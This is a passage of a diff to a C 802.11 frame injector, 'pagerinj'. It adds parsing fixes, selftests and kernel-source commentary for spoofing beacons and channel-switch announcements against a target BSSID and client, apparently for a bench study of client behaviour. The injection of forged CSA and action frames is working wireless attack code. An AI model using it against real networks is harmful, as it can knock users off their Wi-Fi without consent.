@@ -38,14 +38,38 @@
  *               no interface, no privileges — this is how the build is checked before the bench.
  *
  * On radiotap: the header here is minimal on purpose — 8 bytes, it_present = 0, no rate and no TX
- * flags.  ieee80211_monitor_start_xmit() memsets the tx_info, sets REQ_TX_STATUS | INJECTED and
- * then only calls ieee80211_validate_radiotap_len(), which checks it_len is sane rather than that
- * any field is present; the rate block is guarded on the rate field existing and, even when it
- * exists but cannot be resolved, clears IEEE80211_TX_CTRL_RATE_INJECT and falls through to normal
- * rate control instead of rejecting.  So no fields are required.  [V] on that path.  What is NOT
- * settled is mt76 downstream of it — and the cure for that is a control, not more fields: send the
- * identical frame on 2.4 GHz ch 6 first and confirm the external receiver hears it.  If it lands,
- * radiotap and the driver are both ruled out and any silence on ch 52 is the gate.
+ * flags (--phy-rate adds one RATE field and nothing else).  What the kernel does with it, READ at
+ * upstream v6.12 -- net/mac80211/tx.c (sha256 40ad6711…f27b) and net/wireless/radiotap.c
+ * (28be517a…d710).  The Pager's mac80211 is backports-6.12, so these are the lines to re-check:
+ *   - ieee80211_monitor_start_xmit() (tx.c:2301) memsets the tx_info and sets
+ *     REQ_TX_STATUS | INJECTED (:2317-2319); ieee80211_validate_radiotap_len() (:2322 -> fail)
+ *     checks only version 0 and that it_len fits the skb (:2065-2083); then the chanctx / DISABLED /
+ *     reg_can_beacon gates (:2388-2427); and then, AFTER the regulatory check,
+ *     `if (!ieee80211_parse_tx_radiotap(skb, dev)) goto fail_rcu;` (:2445-2446).  fail_rcu and fail
+ *     (:2456-2460) both dev_kfree_skb() and return NETDEV_TX_OK -- one more silent drop,
+ *     indistinguishable from the regulatory one.  [V]
+ *   - ieee80211_parse_tx_radiotap() (tx.c:2085) returns false on: validate_radiotap_len again
+ *     (:2105-2106); a FLAGS field with F_FCS on an skb shorter than it_len + 4 (:2140-2141); and an
+ *     iterator result other than -ENOENT (:2251-2252).  Its rate block (:2254-2296) runs only when
+ *     a RATE/MCS/VHT field was found, and an unresolvable legacy rate clears
+ *     IEEE80211_TX_CTRL_RATE_INJECT (:2290-2291) and falls through to normal rate control rather
+ *     than rejecting.  [V]
+ *   - the iterator returns -EINVAL when a field's bytes would run past it_len (radiotap.c:316-319)
+ *     or an EXT bitmap does (:128-146), and -ENOENT at bit 31 of a word whose EXT bit is clear
+ *     (:221-223).  [V]
+ * Conclusion (inference, not a reading): with it_present = 0 the iterator walks 31 absent bits and
+ * returns -ENOENT, which passes :2251, rate_found stays false, and the frame reaches
+ * ieee80211_xmit() -- no fields are required.  An earlier version of this paragraph said
+ * monitor_start_xmit "only calls validate_radiotap_len" and described the rate block as if it sat
+ * there; it sits in parse_tx_radiotap, which IS called, and which can drop.  So any field added to
+ * this header (plan B0 control 5 asks for RATE on 6 GHz) must keep it_len and the present bitmap
+ * consistent, or the -EINVAL above becomes a silent drop after the regulatory gate -- the same
+ * observable as a gate-2 drop, which only the same-run 5180 control (plan B0 control 3) separates.
+ * Falsified by: the backports tx.c on the device differing from upstream v6.12 at these lines, or a
+ * frame with a malformed radiotap field landing at the external receiver.
+ * What is NOT settled is mt76 downstream of all this — and the cure for that is a control, not more
+ * fields: send the identical frame on 2.4 GHz ch 6 first and confirm the external receiver hears
+ * it.  If it lands, radiotap and the driver are both ruled out and any silence on ch 52 is the gate.
  *
  * Build: see the Makefile beside this file.  Target is mipsel_24kc / musl / soft-float; the
  * loader name must come out as /lib/ld-musl-mipsel-sf.so.1 or it will not run on the Pager.
@@ -62,6 +86,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <time.h>
+#include <signal.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
@@ -73,9 +98,37 @@
 
 /* Minimal radiotap header for injection: version 0, no present fields.  mac80211 fills in its
  * own defaults for rate and TX flags, which is what we want — we are testing the stack's gates,
- * not a particular PHY rate. */
-static const uint8_t RTAP_TX[] = { 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00 };
-#define RTAP_TX_LEN (sizeof RTAP_TX)
+ * not a particular PHY rate.  --phy-rate turns it into a 9-byte header carrying one RATE field
+ * (plan B0 control 5: on 6 GHz the default legacy rate is itself a confound). */
+static uint8_t rtap_tx[12] = { 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00 };
+static size_t  rtap_tx_len = 8;
+#define RTAP_TX     rtap_tx
+#define RTAP_TX_LEN rtap_tx_len
+#define RT_RATE   2          /* IEEE80211_RADIOTAP_RATE: one byte, 500 kbps units, 1-byte aligned */
+
+/* Set (mbps 1..127) or clear (mbps == 0) the RATE field.  Fields sit in present-bit order right
+ * after the present word; with only bit 2 set the byte lands at offset 8 and it_len becomes 9.
+ * Keeping it_len and the bitmap consistent is what keeps ieee80211_radiotap_iterator_next() from
+ * returning -EINVAL (radiotap.c:316-319 at v6.12), which ieee80211_parse_tx_radiotap() turns into a
+ * silent drop AFTER the regulatory gate (tx.c:2251-2252, :2445-2446) -- see the file header.  The
+ * unit is 500 kbps: tx.c:2282 matches `rate * 5` against sband bitrates in 100 kbps units, so
+ * whole Mbps up to 127 fit the byte.  Returns -1 for a value outside 0..127. */
+static int rtap_tx_set_rate(int mbps)
+{
+    if (mbps < 0 || mbps > 127)
+        return -1;
+    memset(rtap_tx, 0, sizeof rtap_tx);
+    if (mbps == 0) {
+        rtap_tx[2]  = 0x08;                       /* it_len = 8, nothing present */
+        rtap_tx_len = 8;
+        return 0;
+    }
+    rtap_tx[2]  = 0x09;                           /* it_len = 9 */
+    rtap_tx[4]  = (uint8_t)(1u << RT_RATE);       /* it_present: RATE only */
+    rtap_tx[8]  = (uint8_t)(mbps * 2);            /* 500 kbps units */
+    rtap_tx_len = 9;
+    return 0;
+}
 
 /* Radiotap bits we care about when parsing a *captured* frame. */
 #define RT_TSFT   0
@@ -358,8 +411,9 @@ static size_t nonce_frame_build(const char *nonce, uint8_t chan,
                                 uint8_t *out, size_t out_cap)
 {
     size_t nlen = strlen(nonce);
-    if (nlen > 32)
-        nlen = 32;
+    if (nlen > 32)           /* an SSID is at most 32 bytes.  Refuse rather than truncate, so the
+                              * frame on the air is the one the status line describes. */
+        return 0;
     size_t need = RTAP_TX_LEN + IE_START + (2 + nlen) + (2 + 1);
     if (need > out_cap)
         return 0;
@@ -390,6 +444,93 @@ static size_t nonce_frame_build(const char *nonce, uint8_t chan,
 
     return (size_t)(p - out);
 }
+
+/* ------------------------------------------------------- element helpers */
+
+/* Find element `eid` in a beacon body (radiotap and FCS already stripped; the IE list starts at
+ * IE_START).  Same bounds shape as the kernel's for_each_element(): stop when fewer than 2 bytes
+ * remain or an element's length overruns the frame.  Returns a pointer to the element's ID byte,
+ * or NULL. */
+static const uint8_t *ie_find(const uint8_t *f, size_t flen, uint8_t eid)
+{
+    size_t off = IE_START;
+    while (off + 2 <= flen) {
+        size_t elen = f[off + 1];
+        if (off + 2 + elen > flen)
+            return NULL;
+        if (f[off] == eid)
+            return f + off;
+        off += 2 + elen;
+    }
+    return NULL;
+}
+
+/* A beacon that already carries a CSA (37) or eCSA (60) element is not a clean clone source.  The
+ * element csa_frame_build() appends would be the SECOND of its ID, and the client reads the FIRST:
+ * ieee80211_mgd_csa_present() finds it with cfg80211_find_elem() (mlme.c:8339-8340 at v6.12),
+ * which returns the first match -- so a count=3 appended behind pineapd's {37,3,1,ch,0} reads as
+ * count 0, and the 17a count arm silently becomes a second control.  The realistic sources are
+ * pineapd's own CSA flood for the same BSSID and an earlier pagerinj run still transmitting; both
+ * reach this socket because dev_queue_xmit_nit() hands every outgoing frame on the interface to
+ * every packet tap on it except the sending socket (dev.c:2290-2343 and skb_loop_sk() :2260-2271
+ * at v6.12).  capture_beacon() skips these and keeps waiting for a clean one. */
+static int beacon_has_chansw(const uint8_t *f, size_t flen)
+{
+    return ie_find(f, flen, EID_CSA) != NULL || ie_find(f, flen, EID_ECSA) != NULL;
+}
+
+/* The DS Parameter Set (element 3) names the channel the BSS is on.  Returns it, or -1 when the
+ * beacon carries none -- -1 means "unknown", not "different". */
+static int beacon_ds_chan(const uint8_t *f, size_t flen)
+{
+    const uint8_t *ds = ie_find(f, flen, EID_DS);
+    if (!ds || ds[1] != 1)
+        return -1;
+    return ds[2];
+}
+
+/* The --chan refusal.  A CSA naming the channel the BSS is already on announces no move, and what
+ * the client does with it is not what 17a measures: with mode 0 csa_present() discards it before
+ * the count is looked at (mlme.c:8351-8352 at v6.12,
+ * `if (csa && !csa->mode && csa->new_ch_num == cur_channel) csa = NULL;`), and on the move path
+ * ieee80211_sta_process_chanswitch() ignores a switch to the identical chandef when it arrived in
+ * an action frame (any mode) or in a beacon with mode 0 (mlme.c:2533-2543: one "tries to
+ * chanswitch to same channel, ignore" log line, then silence).  [V] on both readings.  A
+ * beacon-borne mode-1 same-channel CSA is not ignored there, but there is still no channel change
+ * to observe.  So --chan equal to the cloned beacon's DS channel is refused unless --allow-same-chan
+ * says it was meant.  Returns 1 to refuse.  (Only --csa can check this: --action builds from
+ * scratch and reads no beacon, so there the operator's --chan is taken on trust.) */
+static int same_chan_refused(const uint8_t *f, size_t flen, int chan, int allow)
+{
+    return !allow && beacon_ds_chan(f, flen) == chan;
+}
+
+/* Numeric option parsing: the whole argument must be consumed, non-empty, and within [lo, hi].
+ * atoi() turned "" (an unset shell variable) and "three" into 0 -- a VALID --count, which in the
+ * 17a pair collapses the count=3 arm into the control arm with no error. */
+static int num_parse(const char *s, long lo, long hi, long *out)
+{
+    char *end = NULL;
+    errno = 0;
+    long v = strtol(s, &end, 10);
+    if (*s == '\0' || *end != '\0' || errno != 0 || v < lo || v > hi)
+        return -1;
+    *out = v;
+    return 0;
+}
+
+static int num(const char *opt, const char *s, long lo, long hi)
+{
+    long v;
+    if (num_parse(s, lo, hi, &v) < 0) {
+        fprintf(stderr, "%s: bad value '%s' (need a whole number %ld..%ld)\n", opt, s, lo, hi);
+        exit(2);
+    }
+    return (int)v;
+}
+
+static size_t capture_beacon(int fd, const uint8_t *bssid, int timeout_s,
+                             uint8_t *out, size_t out_cap, int *skipped, int *rx_errno);
 
 /* ------------------------------------------------------------------- selftest */
 
@@ -608,13 +749,96 @@ static int selftest(void)
 
     const uint8_t rt_ext[] = { 0x00,0x00, 0x0d,0x00, 0x02,0x00,0x00,0x80,
                                0x00,0x00,0x00,0x00, RT_FLAG_FCS };
-    st("rtap: walks an extended present bitmap", rtap_parse(rt_ext, sizeof rt_ext, &fcs) == 13);
+    /* FLAGS sits after the second present word, at offset 12; a parser that did not walk the
+     * extension would read offset 8 (0x00) and report no FCS, so fcs is asserted, not only it_len. */
+    st("rtap: walks an extended present bitmap (it_len 13, FLAGS read past it, FCS seen)",
+       rtap_parse(rt_ext, sizeof rt_ext, &fcs) == 13 && fcs == 1);
 
     st("rtap: rejects a truncated header", rtap_parse(rt_plain, 4, &fcs) == -1);
     const uint8_t rt_bad[] = { 0x01,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
     st("rtap: rejects a non-zero version", rtap_parse(rt_bad, sizeof rt_bad, &fcs) == -1);
     const uint8_t rt_lie[] = { 0x00,0x00, 0xff,0x00, 0x00,0x00,0x00,0x00 };
     st("rtap: rejects it_len past the buffer", rtap_parse(rt_lie, sizeof rt_lie, &fcs) == -1);
+
+    /* --- the two rejection arms the README claimed covered and the selftest never reached --- */
+    const uint8_t rt_tiny[] = { 0x00,0x00, 0x04,0x00, 0x00,0x00,0x00,0x00 };
+    st("rtap: rejects it_len below the 8-byte minimum", rtap_parse(rt_tiny, sizeof rt_tiny, &fcs) == -1);
+    {
+        const uint8_t *b2 = NULL;
+        st("strip: rejects a capture that is radiotap only (no frame after it)",
+           strip_capture(rt_plain, sizeof rt_plain, &b2) == 0 && b2 == NULL);
+    }
+
+    /* --- clone-source hygiene: a beacon already carrying a CSA/eCSA is skipped, not cloned --- */
+    {
+        uint8_t with37[sizeof FIX_BEACON + 5], with60[sizeof FIX_BEACON + 6];
+        memcpy(with37, FIX_BEACON, sizeof FIX_BEACON); memcpy(with37 + sizeof FIX_BEACON, want_pineapd, 5);
+        memcpy(with60, FIX_BEACON, sizeof FIX_BEACON); memcpy(with60 + sizeof FIX_BEACON, want_ecsa, 6);
+        st("chansw: the fixture beacon carries no CSA/eCSA", !beacon_has_chansw(FIX_BEACON, sizeof FIX_BEACON));
+        st("chansw: pineapd's {37,3,1,ch,0} appended -> flagged", beacon_has_chansw(with37, sizeof with37));
+        st("chansw: an eCSA (60) appended -> flagged", beacon_has_chansw(with60, sizeof with60));
+
+        /* Through the real receive loop, over a socketpair: a flooded beacon first, then a clean
+         * one.  The clean one must come back and the flooded one must be counted as skipped. */
+        int sp[2];
+        int skipped = -1, rx_err = -1;
+        uint8_t got[4096];
+        size_t gl = 0;
+        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp) == 0) {
+            uint8_t cap37[8 + sizeof with37], capc[8 + sizeof FIX_BEACON];
+            memcpy(cap37, rt_plain, 8); memcpy(cap37 + 8, with37, sizeof with37);
+            memcpy(capc,  rt_plain, 8); memcpy(capc  + 8, FIX_BEACON, sizeof FIX_BEACON);
+            if (write(sp[1], cap37, sizeof cap37) == (ssize_t)sizeof cap37 &&
+                write(sp[1], capc,  sizeof capc)  == (ssize_t)sizeof capc)
+                gl = capture_beacon(sp[0], FIX_BEACON + 16, 2, got, sizeof got, &skipped, &rx_err);
+            close(sp[0]); close(sp[1]);
+        }
+        st("capture: a CSA-bearing beacon from the BSSID is skipped, not cloned", skipped == 1 && rx_err == 0);
+        st("capture: the next clean beacon from the BSSID is the one returned",
+           gl == sizeof FIX_BEACON && st_eqmem(got, FIX_BEACON, gl));
+        st("capture: a hard recv() error returns at once with errno set, not the channel hint",
+           capture_beacon(-1, FIX_BEACON + 16, 5, got, sizeof got, &skipped, &rx_err) == 0 &&
+           rx_err == EBADF && skipped == 0);
+    }
+
+    /* --- the --chan refusal: --chan equal to the beacon's DS Parameter Set --- */
+    st("same-chan: --chan 52 against a DS ch 52 beacon is refused",
+       same_chan_refused(FIX_BEACON, sizeof FIX_BEACON, 52, 0) == 1);
+    st("same-chan: --allow-same-chan overrides the refusal",
+       same_chan_refused(FIX_BEACON, sizeof FIX_BEACON, 52, 1) == 0);
+    st("same-chan: --chan 36 against a DS ch 52 beacon is not refused",
+       same_chan_refused(FIX_BEACON, sizeof FIX_BEACON, 36, 0) == 0);
+    st("same-chan: a beacon with no DS element (5 GHz may omit it) is not refused",
+       beacon_ds_chan(FIX_BEACON, IE_START + 7) == -1 &&
+       same_chan_refused(FIX_BEACON, IE_START + 7, 52, 0) == 0);
+
+    /* --- nonce length: refused, not truncated --- */
+    st("nonce frame: a 33-byte nonce is refused (SSID max 32), not truncated",
+       nonce_frame_build("123456789012345678901234567890123", 1, buf, sizeof buf) == 0);
+    n = nonce_frame_build("12345678901234567890123456789012", 1, buf, sizeof buf);
+    st("nonce frame: a 32-byte nonce is built with SSID length 32",
+       n > 0 && buf[RTAP_TX_LEN + IE_START + 1] == 32);
+
+    /* --- numeric options: whole argument, non-empty, in range --- */
+    long v = -1;
+    st("num: '3' in 0..255 -> 3", num_parse("3", 0, 255, &v) == 0 && v == 3);
+    st("num: '' is rejected (atoi gave 0, a valid --count)", num_parse("", 0, 255, &v) < 0);
+    st("num: '3x' is rejected (atoi gave 3)", num_parse("3x", 0, 255, &v) < 0);
+    st("num: '256' is rejected for a 0..255 option", num_parse("256", 0, 255, &v) < 0);
+
+    /* --- --phy-rate: the RATE field plan B0 control 5 asks for on 6 GHz --- */
+    st("phy-rate: 128 Mbps does not fit the byte and is rejected", rtap_tx_set_rate(128) == -1);
+    st("phy-rate: 6 Mbps -> it_len 9, it_present = RATE only, byte 8 = 12 (500 kbps units)",
+       rtap_tx_set_rate(6) == 0 && RTAP_TX_LEN == 9 &&
+       RTAP_TX[0] == 0 && RTAP_TX[1] == 0 && RTAP_TX[2] == 9 && RTAP_TX[3] == 0 &&
+       RTAP_TX[4] == 0x04 && RTAP_TX[5] == 0 && RTAP_TX[6] == 0 && RTAP_TX[7] == 0 && RTAP_TX[8] == 12);
+    n = nonce_frame_build("PAGERINJ-a1b2c3d4", 52, buf, sizeof buf);
+    st("phy-rate: built frames carry the 9-byte header and the 802.11 body starts at offset 9",
+       n > 9 && buf[2] == 9 && buf[9] == FC_MGMT_BEACON_0);
+    st("phy-rate: our own rtap_parse() walks the header (it_len 9, no FCS flag)",
+       rtap_parse(buf, n, &fcs) == 9 && fcs == 0);
+    st("phy-rate: 0 restores the 8-byte header",
+       rtap_tx_set_rate(0) == 0 && RTAP_TX_LEN == 8 && RTAP_TX[2] == 8 && RTAP_TX[4] == 0);
 
     printf("== %d checks, %d failed ==\n", st_n, st_fail);
     return st_fail ? 1 : 0;
@@ -630,6 +854,19 @@ static int open_mon(const char *ifname, int *ifindex)
     memset(&ifr, 0, sizeof ifr);
     snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
     if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("SIOCGIFINDEX"); close(fd); return -1; }
+    /* Bind the socket to the interface.  Unbound, an ETH_P_ALL packet socket is registered with
+     * prot_hook.dev unset (af_packet.c:3454-3456 at v6.12) and so lands on the global ptype_all
+     * list (dev.c:574), i.e. it receives from EVERY interface; bind() is what sets prot_hook.dev
+     * (packet_do_bind, af_packet.c:3322).  Without it capture_beacon() could clone a beacon that
+     * wlan0mon heard while wlan1mon -- the interface the clone is then sent on -- sits on another
+     * channel, and the "is the interface on the target's channel?" hint could never fire.
+     * Reproduced on a laptop: a beacon transmitted only on lo satisfied a capture on -i eth0. */
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof sll);
+    sll.sll_family   = AF_PACKET;
+    sll.sll_protocol = htons(ETH_P_ALL);
+    sll.sll_ifindex  = ifr.ifr_ifindex;
+    if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) { perror("bind"); close(fd); return -1; }
     *ifindex = ifr.ifr_ifindex;
     return fd;
 }
@@ -645,21 +882,31 @@ static int tx(int fd, int ifindex, const uint8_t *f, size_t n)
     return (int)sendto(fd, f, n, 0, (struct sockaddr *)&sll, sizeof sll);
 }
 
-/* Capture one beacon for `bssid`.  Returns the 802.11 frame with radiotap stripped and any
- * trailing FCS removed, which is what csa_frame_build() expects. */
+/* Capture one clean beacon for `bssid` on the bound interface.  Returns the 802.11 frame with
+ * radiotap stripped and any trailing FCS removed, which is what csa_frame_build() expects.
+ * Beacons from this BSSID that already carry a CSA/eCSA element are skipped (beacon_has_chansw())
+ * and counted in *skipped.  Returns 0 on timeout, or at once on a hard recv() error with *rx_errno
+ * set; EAGAIN/EWOULDBLOCK (nothing queued) and EINTR are retried until the deadline. */
 static size_t capture_beacon(int fd, const uint8_t *bssid, int timeout_s,
-                             uint8_t *out, size_t out_cap)
+                             uint8_t *out, size_t out_cap, int *skipped, int *rx_errno)
 {
     uint8_t buf[4096];
     time_t deadline = time(NULL) + timeout_s;
+    *skipped = 0;
+    *rx_errno = 0;
     while (time(NULL) < deadline) {
         ssize_t n = recv(fd, buf, sizeof buf, MSG_DONTWAIT);
+        if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
+            *rx_errno = errno;
+            return 0;
+        }
         if (n <= 0) { struct timespec ts = {0, 2000000}; nanosleep(&ts, NULL); continue; }
         const uint8_t *f = NULL;
         size_t flen = strip_capture(buf, (size_t)n, &f);
         if (!flen || flen < IE_START) continue;
         if (f[0] != FC_MGMT_BEACON_0 || (f[1] & 0x0c) != 0x00) continue;
         if (memcmp(f + 16, bssid, 6) != 0) continue;
+        if (beacon_has_chansw(f, flen)) { (*skipped)++; continue; }
         if (flen > out_cap) continue;
         memcpy(out, f, flen);
         return flen;
@@ -676,34 +923,60 @@ static int parse_mac(const char *s, uint8_t *out)
     return 0;
 }
 
+/* --secs 0 runs until interrupted.  Without a handler SIGINT killed the process before the
+ * sent=/failed= summary, so the "sendto success does NOT mean transmitted" reminder never printed
+ * for exactly the mode that runs longest.  The handler only sets a flag; the transmit loop checks
+ * it, and nanosleep() returns EINTR at once so the check is prompt.  It is installed only for the
+ * transmit loop -- an interrupt during the beacon wait still kills the process as before. */
+static volatile sig_atomic_t stop_flag = 0;
+static void on_stop(int sig) { (void)sig; stop_flag = 1; }
+
 static void usage(void)
 {
     fprintf(stderr,
       "pagerinj — minimal 802.11 injector (never changes the channel)\n"
       "\n"
       "  pagerinj --selftest\n"
-      "  pagerinj -i <iface> --nonce <text> [--chan N] [--rate N] [--secs N]\n"
+      "  pagerinj -i <iface> --nonce <text> [--chan N] [--rate N] [--secs N] [--phy-rate M]\n"
       "  pagerinj -i <iface> --csa --bssid <mac> --chan N --count N\n"
-      "                      [--ecsa-count N --ecsa-opclass N]\n"
-      "                      [--mode N] [--rate N] [--secs N] [--wait N]\n"
+      "                      [--ecsa-count N --ecsa-opclass N] [--allow-same-chan]\n"
+      "                      [--mode N] [--rate N] [--secs N] [--wait N] [--phy-rate M]\n"
       "  pagerinj -i <iface> --action --bssid <mac> --client <mac> --chan N --count N\n"
-      "                      [--mode N] [--rate N] [--secs N]\n"
+      "                      [--mode N] [--rate N] [--secs N] [--phy-rate M]\n"
       "\n"
-      "  --rate         frames per second (default 10)\n"
-      "  --secs         how long to transmit; 0 = until interrupted (default 10)\n"
-      "  --count        CSA Channel Switch Count.  pineapd hardcodes 0, which the kernel\n"
+      "  --chan         1-255.  For --csa and --action it is the CSA New Channel Number: the\n"
+      "                 channel the client is TOLD TO GO TO, not the one you are on.  Make it\n"
+      "                 differ from the target's current channel -- a same-channel CSA announces\n"
+      "                 no move; with --mode 0 csa_present() discards it before reading the\n"
+      "                 count (mlme.c:8351, v6.12), and in an action frame it is ignored for any\n"
+      "                 mode (mlme.c:2533).  --csa refuses when the cloned beacon's DS Parameter\n"
+      "                 Set equals --chan, unless --allow-same-chan is given.  For --nonce it is\n"
+      "                 only the nonce beacon's own DS Parameter Set (default 1): set it to the\n"
+      "                 channel you parked the interface on.\n"
+      "  --allow-same-chan  transmit a --csa clone even though --chan equals its DS channel.\n"
+      "  --count        0-255.  CSA Channel Switch Count.  pineapd hardcodes 0, which the kernel\n"
       "                 discards before the auth/assoc refusal check.  17a is 0 vs 3.\n"
-      "  --mode         CSA Channel Switch Mode (default 1, matching pineapd)\n"
-      "  --wait         seconds to wait for a beacon from --bssid (default 10)\n"
-      "  --ecsa-count   also append an Extended CSA (element 60) with this count.  17a's\n"
+      "  --mode         0-255.  CSA Channel Switch Mode (default 1, matching pineapd)\n"
+      "  --rate         frames per second, 1-1000 (default 10)\n"
+      "  --phy-rate     legacy PHY rate in whole Mbps, 1-127: adds one radiotap RATE field (bit 2,\n"
+      "                 one byte in 500 kbps units) and nothing else.  Default: no field, mac80211\n"
+      "                 picks the rate.  Plan B0 control 5 asks for it on 6 GHz; run the same\n"
+      "                 frame on 5180 as the rate control.\n"
+      "  --secs         0-86400 seconds to transmit; 0 = until SIGINT/SIGTERM.  The sent=/failed=\n"
+      "                 summary prints either way (default 10)\n"
+      "  --wait         1-3600 seconds to wait for a clean beacon from --bssid on -i (default 10).\n"
+      "                 Beacons that already carry a CSA/eCSA element are skipped and counted.\n"
+      "  --ecsa-count   0-255.  Also append an Extended CSA (element 60) with this count.  17a's\n"
       "                 third arm: leaves pineapd's element byte-identical, and\n"
       "                 csa_present() discards per element, so {37 count=0}+{60 count!=0}\n"
       "                 still returns true.  Requires --ecsa-opclass.\n"
-      "  --ecsa-opclass new operating class for the eCSA.  No default on purpose — read it\n"
-      "                 off the target's Supported Operating Classes element, not from memory.\n"
+      "  --ecsa-opclass 0-255.  New operating class for the eCSA.  No default on purpose — read\n"
+      "                 it off the target's Supported Operating Classes element, not from memory.\n"
       "  --client       A1 for --action.  A3 is set to --bssid; a wrong A3 is dropped\n"
       "                 silently (rx612.c:3738), so both are required.\n"
       "\n"
+      "Stop pineapd first:              /etc/init.d/pineapd stop; sleep 2   -- it hops the interface,\n"
+      "                                 and its CSA flood is a CSA-bearing clone source.\n"
       "Set the channel yourself first:  iw dev <iface> set freq <MHz> 20\n"
       "Run the 2.4 GHz control first:   same frame on ch 6, confirmed at the receiver.  If it\n"
       "lands there, radiotap and the driver are ruled out and silence on ch 52 is the gate.\n");
@@ -713,7 +986,7 @@ int main(int argc, char **argv)
 {
     const char *ifname = NULL, *nonce = NULL;
     int do_csa = 0, do_nonce = 0, do_action = 0, chan = 0, count = -1, mode = 1;
-    int rate = 10, secs = 10, wait_s = 10;
+    int rate = 10, secs = 10, wait_s = 10, phy_rate = 0, allow_same = 0;
     int ecsa_count = -1, ecsa_opclass = -1;
     uint8_t bssid[6]; int have_bssid = 0;
     uint8_t client[6]; int have_client = 0;
@@ -721,29 +994,31 @@ int main(int argc, char **argv)
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
         #define NEXT() (++i < argc ? argv[i] : (usage(), exit(2), ""))
+        #define NUM(lo, hi) num(a, NEXT(), (lo), (hi))   /* whole argument, in range, or exit 2 */
         if      (!strcmp(a, "--selftest")) return selftest();
         else if (!strcmp(a, "-i"))         ifname = NEXT();
         else if (!strcmp(a, "--nonce"))  { do_nonce = 1; nonce = NEXT(); }
         else if (!strcmp(a, "--csa"))      do_csa = 1;
         else if (!strcmp(a, "--action"))   do_action = 1;
+        else if (!strcmp(a, "--allow-same-chan")) allow_same = 1;
         else if (!strcmp(a, "--bssid"))  { if (parse_mac(NEXT(), bssid) < 0) { usage(); return 2; } have_bssid = 1; }
         else if (!strcmp(a, "--client")) { if (parse_mac(NEXT(), client) < 0) { usage(); return 2; } have_client = 1; }
-        else if (!strcmp(a, "--chan"))     chan  = atoi(NEXT());
-        else if (!strcmp(a, "--count"))    count = atoi(NEXT());
-        else if (!strcmp(a, "--mode"))     mode  = atoi(NEXT());
-        else if (!strcmp(a, "--rate"))     rate  = atoi(NEXT());
-        else if (!strcmp(a, "--secs"))     secs  = atoi(NEXT());
-        else if (!strcmp(a, "--wait"))     wait_s = atoi(NEXT());
-        else if (!strcmp(a, "--ecsa-count"))   ecsa_count   = atoi(NEXT());
-        else if (!strcmp(a, "--ecsa-opclass")) ecsa_opclass = atoi(NEXT());
+        else if (!strcmp(a, "--chan"))     chan     = NUM(1, 255);
+        else if (!strcmp(a, "--count"))    count    = NUM(0, 255);
+        else if (!strcmp(a, "--mode"))     mode     = NUM(0, 255);
+        else if (!strcmp(a, "--rate"))     rate     = NUM(1, 1000);
+        else if (!strcmp(a, "--phy-rate")) phy_rate = NUM(1, 127);
+        else if (!strcmp(a, "--secs"))     secs     = NUM(0, 86400);
+        else if (!strcmp(a, "--wait"))     wait_s   = NUM(1, 3600);
+        else if (!strcmp(a, "--ecsa-count"))   ecsa_count   = NUM(0, 255);
+        else if (!strcmp(a, "--ecsa-opclass")) ecsa_opclass = NUM(0, 255);
         else { usage(); return 2; }
+        #undef NUM
         #undef NEXT
     }
 
     if (do_csa + do_nonce + do_action != 1) { usage(); return 2; }
     if (!ifname)                            { usage(); return 2; }
-    if (rate < 1) rate = 1;
-    if (mode < 0 || mode > 255) { usage(); return 2; }
     if (ecsa_count >= 0) {
         /* Not defaulted, and the reason is narrower than this comment first claimed.  Both halves
          * below re-read at upstream v6.12 rather than inherited: csa_present() (mlme.c:8328) takes
@@ -763,20 +1038,21 @@ int main(int argc, char **argv)
          * bad class -> element 37's 0 (immediate switch).  The denial arm is unaffected either way.
          * That is the real reason to read the value off the target instead of guessing -- a guess
          * that happens to parse silently changes what the move arm measures. */
-        if (!do_csa || ecsa_count > 255 || ecsa_opclass < 0 || ecsa_opclass > 255) {
+        if (!do_csa || ecsa_opclass < 0) {
             fprintf(stderr, "--ecsa-count needs --csa and an explicit --ecsa-opclass\n");
             usage(); return 2;
         }
     }
     if (do_csa || do_action) {
-        if (!have_bssid || chan <= 0 || chan > 255 || count < 0 || count > 255) { usage(); return 2; }
+        if (!have_bssid || chan <= 0 || count < 0) { usage(); return 2; }
     }
     if (do_action && !have_client) {
         fprintf(stderr, "--action needs --client (A1) as well as --bssid (A2/A3)\n");
         usage(); return 2;
     }
-    if (do_nonce && (chan <= 0 || chan > 255))
+    if (do_nonce && chan <= 0)
         chan = 1;   /* only cosmetic for the nonce beacon's DS element */
+    if (phy_rate && rtap_tx_set_rate(phy_rate) < 0) { usage(); return 2; }
 
     /* csa_present() carries a SECOND per-element discard that is easy to walk into, and that
      * neither this file nor the docs mentioned until it was read at v6.12 (mlme.c:8350, and the
@@ -802,7 +1078,7 @@ int main(int argc, char **argv)
 
     if (do_nonce) {
         flen = nonce_frame_build(nonce, (uint8_t)chan, frame, sizeof frame);
-        if (!flen) { fprintf(stderr, "nonce too long\n"); close(fd); return 1; }
+        if (!flen) { fprintf(stderr, "nonce too long (max 32 bytes: it is the SSID)\n"); close(fd); return 2; }
         fprintf(stderr, "nonce beacon: ssid=\"%s\" src=%02x:%02x:%02x:%02x:%02x:%02x %zu bytes\n",
                 nonce, frame[RTAP_TX_LEN+10], frame[RTAP_TX_LEN+11], frame[RTAP_TX_LEN+12],
                 frame[RTAP_TX_LEN+13], frame[RTAP_TX_LEN+14], frame[RTAP_TX_LEN+15], flen);
@@ -820,12 +1096,32 @@ int main(int argc, char **argv)
                         "frame is dropped with no log\n");
     } else {
         uint8_t cap[4096];
-        fprintf(stderr, "waiting up to %ds for a beacon from %02x:%02x:%02x:%02x:%02x:%02x ...\n",
-                wait_s, bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
-        size_t clen = capture_beacon(fd, bssid, wait_s, cap, sizeof cap);
+        int skipped = 0, rx_err = 0;
